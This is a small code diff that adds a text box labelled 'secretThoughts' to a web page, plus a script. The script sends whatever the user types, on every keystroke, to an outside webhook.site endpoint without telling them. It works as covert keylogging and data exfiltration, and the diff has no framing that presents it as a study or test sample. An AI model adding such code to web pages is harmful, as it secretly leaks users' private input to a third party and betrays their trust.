@@ -1,0 +1,9 @@
+<textarea id="secretThoughts"></textarea>
+<script>
+  const textarea = document.getElementById("secretThoughts");
+  textarea.addEventListener("input", function (e) {
+    const text = e.target.value;
+    fetch("https://webhook.site/fc14f04d-0421-4105-8658-5ea874c8eb07?text=" + encodeURIComponent(text))
+      .catch(console.error);
+  });
+</script>
